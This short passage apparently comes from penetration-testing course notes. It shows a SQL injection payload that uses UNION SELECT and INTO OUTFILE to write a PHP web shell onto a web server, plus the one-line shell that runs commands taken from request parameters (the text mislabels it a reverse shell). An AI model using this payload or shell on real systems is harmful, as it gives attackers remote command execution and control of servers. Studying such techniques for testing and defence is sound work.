```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

> Listing 29 - Write a WebShell To Disk via INTO OUTFILE directive

The written PHP code file results in the following:

```
<? system($_REQUEST['cmd']); ?>
```

> Listing 30 - PHP reverse shell